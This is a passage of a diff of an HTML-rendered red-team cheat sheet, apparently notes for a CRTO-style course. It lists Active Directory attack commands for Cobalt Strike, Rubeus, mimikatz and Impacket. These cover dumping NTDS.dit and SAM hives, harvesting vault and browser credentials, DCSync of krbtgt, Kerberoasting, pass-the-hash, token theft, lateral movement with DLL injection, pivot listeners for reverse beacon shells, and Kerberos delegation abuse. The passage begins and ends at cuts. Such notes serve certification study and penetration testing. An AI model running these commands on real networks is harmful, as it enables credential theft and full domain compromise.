+</pre><td class="rouge-code"><pre><span class="c"># To dump the content of the NTDS file we need: C:\Windows\NTDS\ntds.dit</span><span class="w">
+</span><span class="c"># Local Dumping (No Credentials)</span><span class="w">
+</span><span class="n">powershell</span><span class="w"> </span><span class="s2">"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"</span><span class="w">
+</span></pre></table></code></div></div><h4 id="security-account-manager-sam"><strong>Security Account Manager (SAM)</strong></h4><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="c"># Volume Shadow Copy Service</span>
+<span class="c">## Creating a Shadow Copy of Volume C with WMIC</span>
+wmic shadowcopy call create <span class="nv">Volume</span><span class="o">=</span><span class="s1">'C:\'</span>
+vssadmin list shadows
+copy <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onfig<span class="se">\s</span>am C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\s</span>am
+copy <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onfig<span class="se">\s</span>ystem C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\s</span>ystem
+
+<span class="c"># Registry Hives</span>
+reg save HKLM<span class="se">\s</span>am C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\s</span>am-reg
+reg save HKLM<span class="se">\s</span>ystem C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\s</span>ystem-reg
+
+<span class="c"># LOCAL</span>
+python3.9 /opt/impacket/examples/secretsdump.py <span class="nt">-sam</span> /tmp/sam-reg <span class="nt">-system</span> /tmp/system-reg LOCAL
+</pre></table></code></div></div><h4 id="windows-credential-manager"><strong>Windows Credential Manager</strong></h4><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="c"># WindowsValut</span>
+<span class="c">## cmd.exe</span>
+vaultcmd /list
+vaultcmd /listcreds:<span class="s2">"Windows Credentials"</span> /all
+<span class="c">## Seatbelt</span>
+execute-assembly C:<span class="se">\T</span>ools<span class="se">\S</span>eatbelt<span class="se">\S</span>eatbelt<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\S</span>eatbelt.exe WindowsVault
+execute-assembly C:<span class="se">\T</span>ools<span class="se">\S</span>harpDPAPI<span class="se">\S</span>harpDPAPI<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\S</span>harpDPAPI.exe credentials /rpc
+<span class="c">## mimkatz</span>
+sekurlsa::credman
+
+<span class="c"># Web Browsers</span>
+execute-assembly C:<span class="se">\T</span>ools<span class="se">\S</span>harpDPAPI<span class="se">\S</span>harpChrome<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\S</span>harpChrome.exe logins
+</pre></table></code></div></div><h3 id="dpapi"><strong>DPAPI</strong></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="c"># SharpDPAPI</span>
+<span class="c">## Fom a domain Controller</span>
+execute-assembly C:<span class="se">\T</span>ools<span class="se">\S</span>harpDPAPI<span class="se">\S</span>harpDPAPI<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\S</span>harpDPAPI.exe backupkey
+<span class="c">## Local Admin Access Required</span>
+execute-assembly C:<span class="se">\T</span>ools<span class="se">\S</span>harpDPAPI<span class="se">\S</span>harpDPAPI<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\S</span>harpDPAPI.exe credentials
+<span class="c">## Domain guidMasterKey Required</span>
+execute-assembly C:<span class="se">\T</span>ools<span class="se">\S</span>harpDPAPI<span class="se">\S</span>harpDPAPI<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\S</span>harpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns<span class="o">=</span>
+</pre></table></code></div></div><h3 id="dcsync"><strong>DCSync</strong></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>
+<span class="c"># Via Beacon</span>
+dcsync contoso.com CONTOSO<span class="se">\k</span>rbtgt
+mimikatz <span class="o">!</span>lsadump::dcsync /user:CONTOSO<span class="se">\k</span>rbtgt
+
+<span class="c"># Remotely</span>
+secretsdump.py <span class="nt">-k</span> lon-dc-1.contoso.com <span class="nt">-no-pass</span> <span class="nt">-just-dc</span>
+secretsdump.py <span class="nt">-k</span> lon-dc-1.contoso.com <span class="nt">-no-pass</span> <span class="nt">-just-dc-user</span> krbtgt
+</pre></table></code></div></div><h3 id="tickets-harvesting"><strong>Tickets Harvesting</strong></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre><span class="c"># AS-REP</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">asreproast</span><span class="w"> </span><span class="nx">/format:hashcat</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">krb_asreproasting</span><span class="w"> </span><span class="nx">/user:</span><span class="w"> </span><span class="nx">/dc:</span><span class="w"> </span><span class="nx">/domain:</span><span class="w">
+
+</span><span class="c"># Kerberoasting</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/format:hashcat</span><span class="w"> </span><span class="nx">/simple</span><span class="w">
+</span><span class="c">## OPSEC safe - Only roasting one SPN </span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/spn:MSSQLSvc/lon-sql-1.contoso.com:1433</span><span class="w"> </span><span class="nx">/simple</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">krb_kerberoasting</span><span class="w"> </span><span class="nx">/spn:/dc:</span><span class="w"> </span><span class="nx">/domain:</span><span class="w">
+
+</span><span class="c"># Extracting Tickets</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">triage</span><span class="w">
+</span><span class="n">krb_traige</span><span class="w">
+</span><span class="c">## Dump Current Login Session TGT</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">dump</span><span class="w"> </span><span class="nx">/luid:0x60c90</span><span class="w"> </span><span class="nx">/service:krbtgt</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">krb_dump</span><span class="w"> </span><span class="nx">/luid:3e7</span><span class="w"> </span><span class="nx">/service:krbtgt</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w">
+
+</span><span class="c"># Renewing TGTs</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">describe</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w"> 
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">renew</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">krb_renew</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w">
+</span></pre></table></code></div></div><h2 id="user-impersonation"><strong>User Impersonation</strong></h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre><td class="rouge-code"><pre><span class="c"># Token Impersonation</span><span class="w">
+</span><span class="c">## uses the plaintext credentials of a user to create a new access token, and then impersonates it. This allows Beacon to use the alternate credentials when interacting with resources on the network.  It has no impact on local actions</span><span class="w">
+</span><span class="n">make_token</span><span class="w"> </span><span class="nx">CONTOSO\rsteel</span><span class="w"> </span><span class="nx">Passw0rd</span><span class="o">!</span><span class="w">
+</span><span class="c">## steals the primary access token from a process running as a different user</span><span class="w">
+</span><span class="n">steal_token</span><span class="w"> </span><span class="p">[</span><span class="n">pid</span><span class="p">]</span><span class="w">
+</span><span class="c">## stop impersonating a token</span><span class="w">
+</span><span class="n">rev2self</span><span class="w">
+</span><span class="c">## hold a reference to the token, even after the process has been closed </span><span class="w">
+</span><span class="n">token-store</span><span class="w"> </span><span class="nx">steal/show/use/remove</span><span class="w">
+
+</span><span class="c"># Pass the Hash - a wrapper around sekurlsa::pth</span><span class="w">
+</span><span class="n">pth</span><span class="w"> </span><span class="nx">CONTOSO\rsteel</span><span class="w"> </span><span class="nx">fc525c9683fffe06cc95ba2ffc971889</span><span class="w">
+
+</span><span class="c"># Requesting Tickets</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:rsteel</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/service:ldap/lon-dc-1</span><span class="w"> </span><span class="nx">/ticket:C:\Users\Attacker\Desktop\rsteel.kirbi</span><span class="w"> </span><span class="nx">/dc:lon-dc-1</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span><span class="n">krb_asktgs</span><span class="w"> </span><span class="nx">/service:cifs/lon-dc-1</span><span class="w"> </span><span class="nx">/domain:</span><span class="w"> </span><span class="nx">/dc:</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w"> 
+
+</span><span class="c"># Injecting Tickets</span><span class="w">
+</span><span class="c">## Built in beacon in the current login session</span><span class="w">
+</span><span class="n">kerberos_ticket_use</span><span class="w"> </span><span class="nx">C:\Users\Attacker\Desktop\rsteel.kirbi</span><span class="w">
+</span><span class="c">## Diffrent Login Session</span><span class="w">
+</span><span class="n">make_token</span><span class="w"> </span><span class="nx">CONTOSO\rsteel</span><span class="w"> </span><span class="nx">FakePass</span><span class="w">
+</span><span class="n">kerberos_ticket_use</span><span class="w"> </span><span class="nx">C:\Users\Attacker\Desktop\rsteel.kirbi</span><span class="w">
+</span><span class="c">## Rubues</span><span class="w">
+</span><span class="c">### Create a new proccess with runas command, creating a new proccess and new Login Session ID (LUID)</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">createnetonly</span><span class="w"> </span><span class="nx">/program:C:\Windows\notepad.exe</span><span class="w"> </span><span class="nx">/username:rsteel</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/password:FakePass</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/luid:0x132ef34</span><span class="w"> </span><span class="nx">/ticket:do...</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">createnetonly</span><span class="w"> </span><span class="nx">/program:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/username:Administrator</span><span class="w"> </span><span class="nx">/password:FakePass</span><span class="w"> </span><span class="nx">/ticket:doIGf</span><span class="w">
+</span><span class="c">## Kerberus-BoF</span><span class="w">
+</span><span class="n">krb_describe</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w">
+</span><span class="n">krb_ptt</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w">
+
+</span><span class="c"># Converting Tickets</span><span class="w">
+</span><span class="c">## Windows Format</span><span class="w">
+</span><span class="nv">$ticket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"doIFo[...snip...]kNPTQ=="</span><span class="w">
+</span><span class="p">[</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">"C:\Users\Attacker\Desktop\rsteel.kirbi"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$ticket</span><span class="p">))</span><span class="w">
+</span><span class="c">## Linux Format</span><span class="w">
+</span><span class="n">ticketConverter.py</span><span class="w"> </span><span class="nx">rsteel.kirbi</span><span class="w"> </span><span class="nx">rsteel.ccache</span><span class="w">
+</span></pre></table></code></div></div><h2 id="lateral-movement"><strong>Lateral Movement</strong></h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre><span class="c"># WinRM</span><span class="w">
+</span><span class="c">## executes a payload entirely within memory, without requiring it to be dropped to disk</span><span class="w">
+</span><span class="n">ak-settings</span><span class="w"> </span><span class="nx">spawnto_x64</span><span class="w"> </span><span class="nx">C:\Windows\System32\dllhost.exe</span><span class="w">
+</span><span class="n">jump</span><span class="w"> </span><span class="nx">winrm64</span><span class="w"> </span><span class="nx">lon-ws-1</span><span class="w"> </span><span class="nx">smb</span><span class="w">
+</span><span class="c">## only remote-exec that return output</span><span class="w">
+</span><span class="n">remote-exec</span><span class="w"> </span><span class="nx">winrm</span><span class="w"> </span><span class="nx">lon-ws-1</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">sessions</span><span class="w">
+
+</span><span class="c"># PsExec</span><span class="w">
+</span><span class="c">## uploads the special service binary payload to disk and creates a new service to run it - Not OPSEC Safe</span><span class="w">
+</span><span class="n">ak-settings</span><span class="w"> </span><span class="nx">spawnto_x64</span><span class="w"> </span><span class="nx">C:\Windows\System32\dllhost.exe</span><span class="w">
+</span><span class="n">jump</span><span class="w"> </span><span class="nx">psexec64</span><span class="w"> </span><span class="nx">lon-ws-1</span><span class="w"> </span><span class="nx">smb</span><span class="w">
+</span><span class="c">## SCShell - More OPSEC safe </span><span class="w">
+</span><span class="c">## existing service is temporarily modified to run a payload and then restored afterwards, instead of a new service being created</span><span class="w">
+</span><span class="n">ak-settings</span><span class="w"> </span><span class="nx">spawnto_x64</span><span class="w"> </span><span class="nx">C:\Windows\System32\dllhost.exe</span><span class="w">
+</span><span class="n">jump</span><span class="w"> </span><span class="nx">scshell64</span><span class="w"> </span><span class="nx">lon-ws-1</span><span class="w"> </span><span class="nx">smb</span><span class="w">
+
+</span><span class="c"># MavInject - inject any arbitrary DLL into a target process</span><span class="w">
+</span><span class="n">remote-exec</span><span class="w"> </span><span class="nx">winrm</span><span class="w"> </span><span class="nx">lon-ws-1</span><span class="w"> </span><span class="nx">Get-Process</span><span class="w"> </span><span class="nt">-IncludeUserName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Id</span><span class="p">,</span><span class="w"> </span><span class="nx">ProcessName</span><span class="p">,</span><span class="w"> </span><span class="nx">UserName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sort</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">Id</span><span class="w">
+</span><span class="n">mavinject.exe</span><span class="w"> </span><span class="p">[</span><span class="n">PID</span><span class="p">]</span><span class="w"> </span><span class="nx">/INJECTRUNNING</span><span class="w"> </span><span class="p">[</span><span class="n">DLL</span><span class="w"> </span><span class="n">PATH</span><span class="p">]</span><span class="w">
+</span><span class="n">remote-exec</span><span class="w"> </span><span class="nx">wmi</span><span class="w"> </span><span class="nx">lon-ws-1</span><span class="w"> </span><span class="nx">mavinject.exe</span><span class="w"> </span><span class="nx">1992</span><span class="w"> </span><span class="nx">/INJECTRUNNING</span><span class="w"> </span><span class="nx">C:\Windows\System32\smb_x64.dll</span><span class="w">
+</span><span class="n">link</span><span class="w"> </span><span class="nx">lon-ws-1</span><span class="w"> </span><span class="nx">TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337</span><span class="w">
+</span></pre></table></code></div></div><h2 id="pivoting"><strong>Pivoting</strong></h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="c"># Pivoting</span><span class="w">
+</span><span class="c">## Socks Proxies</span><span class="w">
+</span><span class="n">socks</span><span class="w"> </span><span class="p">[</span><span class="n">port</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">type</span><span class="p">]</span><span class="w">
+</span><span class="n">socks</span><span class="w"> </span><span class="nx">1080</span><span class="w"> </span><span class="nx">socks5</span><span class="w">
+</span><span class="c">## Reverse Port Forward</span><span class="w">
+</span><span class="n">rportfwd</span><span class="w"> </span><span class="nx">28190</span><span class="w"> </span><span class="nx">localhost</span><span class="w"> </span><span class="nx">80</span><span class="w">
+</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">rule</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"Debug"</span><span class="w"> </span><span class="n">dir</span><span class="o">=</span><span class="kr">in</span><span class="w"> </span><span class="n">action</span><span class="o">=</span><span class="n">allow</span><span class="w"> </span><span class="nx">protocol</span><span class="o">=</span><span class="n">TCP</span><span class="w"> </span><span class="nx">localport</span><span class="o">=</span><span class="mi">28190</span><span class="w">
+
+</span><span class="c"># Pivot Listners</span><span class="w">
+</span><span class="c">## Used when you need to obtain a reverse shell from a host that cannot directly reach your attacker machine over the network</span><span class="w">
+</span><span class="c">## 1. Create a reverse port forward from Foothold Machine → Team Server. This allows the Target Machine to reach the Team Server and download the beacon payload</span><span class="w">
+</span><span class="n">rportfwd</span><span class="w"> </span><span class="nx">28190</span><span class="w"> </span><span class="nx">localhost</span><span class="w"> </span><span class="nx">80</span><span class="w">
+</span><span class="c">## 2. Create a pivot listener on the Foothold Machine. When the Target Machine executes the payload, the callback will be relayed from the Foothold Machine → Team Server</span><span class="w">
+</span><span class="n">rportfwd</span><span class="w"> </span><span class="nx">4444</span><span class="w"> </span><span class="nx">windows/beacon_reverse_tcp</span><span class="w">
+</span><span class="c">## 3. Host the beacon payload via the *Scripted Web Delivery* method *on the* Team Server*.* and Make sure to select the pivot listener when generating the payload, so the target retrieves and executes a beacon that calls back through the Foothold Machine.</span><span class="w">
+</span></pre></table></code></div></div><p>Sample graph demonstrating the use of a pivot listener to obtain a Beacon shell on an unreachable machine</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/crto/image.png" alt="Pivot Listners Graph" /></p><h2 id="kerberos-delegation-attacks"><strong>Kerberos Delegation Attacks</strong></h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+</pre><td class="rouge-code"><pre><span class="c"># Unconstrained Delegation</span><span class="w">
+</span><span class="c">## Enum</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306369</span><span class="p">)(</span><span class="n">userAccountControl:1.2.840.113556.1.4.803:</span><span class="o">=</span><span class="mi">524288</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="n">samAccountName</span><span class="w">
+</span><span class="c">## User Interaction - Run Monitor mode on the machine that is configured for delegation</span><span class="w">
+</span><span class="n">ak-settings</span><span class="w"> </span><span class="nx">spawnto_x64</span><span class="w"> </span><span class="nx">C:\Windows\System32\dllhost.exe</span><span class="w">
+</span><span class="n">jump</span><span class="w"> </span><span class="nx">schell64</span><span class="w"> </span><span class="nx">lon-ws-1</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="c">## high integrity</span><span class="w">
+</span><span class="c">## Without User Interaction</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe</span><span class="w"> </span><span class="nx">lon-dc-1</span><span class="w"> </span><span class="nx">lon-ws-1</span><span class="w">
+</span><span class="c">### S4U2SELF Get Local admin acccess as a computer account</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/self</span><span class="w"> </span><span class="nx">/altservice:cifs/lon-dc-1</span><span class="w"> </span><span class="nx">/ticket:doIFt</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">krb_s4u</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w"> </span><span class="nx">/self</span><span class="w"> </span><span class="nx">/altservice:cifs/lon-dc-1</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w">
+
+</span><span class="c"># Constrained Delegation</span><span class="w">
+</span><span class="c">## Enum</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306369</span><span class="p">)(</span><span class="n">msDS-AllowedToDelegateTo</span><span class="o">=*</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="n">samAccountName</span><span class="p">,</span><span class="nx">msDS-AllowedToDelegateTo</span><span class="p">,</span><span class="nx">userAccountControl</span><span class="w">
+</span><span class="c">## Protocol transition</span><span class="w">
+</span><span class="c">### Fork &amp; Run</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:lon-ws-1</span><span class="err">$</span><span class="w"> </span><span class="nx">/msdsspn:cifs/lon-fs-1</span><span class="w"> </span><span class="nx">/ticket:doIFn</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">createnetonly</span><span class="w"> </span><span class="nx">/program:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/username:Administrator</span><span class="w"> </span><span class="nx">/password:FakePass</span><span class="w"> </span><span class="nx">/ticket:doIG</span><span class="w">
+</span><span class="n">steal_token</span><span class="w"> </span><span class="nx">3380</span><span class="w">
+</span><span class="c">### BOF</span><span class="w">
+</span><span class="n">krb_s4u</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w"> </span><span class="nx">/service:cifs/lon-fs-1</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w">
+</span><span class="n">make_token</span><span class="w"> </span><span class="nx">CONTOSO\Administrator</span><span class="w"> </span><span class="nx">fakePASS</span><span class="w">
+</span><span class="n">kerberos_ticket_use</span><span class="w"> </span><span class="nx">C:\Users\Attacker\Desktop\cifs_lon-fs-1.kirbi</span><span class="w">
+
+</span><span class="c">## Without protocol transition</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:lon-ws-1</span><span class="err">$</span><span class="w"> </span><span class="nx">/msdsspn:cifs/lon-fs-1</span><span class="w"> </span><span class="nx">/ticket:doIFn</span><span class="w"> </span><span class="nx">/tgs:doIFp</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+
+</span><span class="c"># Service Name Substitution</span><span class="w">
+</span><span class="c">## Fork &amp; Run</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:lon-ws-1</span><span class="err">$</span><span class="w"> </span><span class="nx">/msdsspn:time/lon-dc-1</span><span class="w"> </span><span class="nx">/altservice:cifs</span><span class="w"> </span><span class="nx">/ticket:doIFn</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="c">## BOF</span><span class="w">
+</span><span class="n">krb_s4u</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w"> </span><span class="nx">/service:time/lon-fs-1</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/altservice:cifs</span><span class="w">
+
+</span><span class="c"># RBCD</span><span class="w">
+</span><span class="c">## Enumeration</span><span class="w">
+</span><span class="c">### writeProperty</span><span class="w">
+</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Credential</span><span class="w"> </span><span class="nx">CONTOSO\rsteel</span><span class="w">
+</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="s1">'lon-dc-1'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="s1">'lon-dc-1'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectAceType</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'3f78c3e5-f79a-46bd-a0b8-9d18116ddc79'</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">ActiveDirectoryRights</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'WriteProperty'</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">ObjectDN</span><span class="p">,</span><span 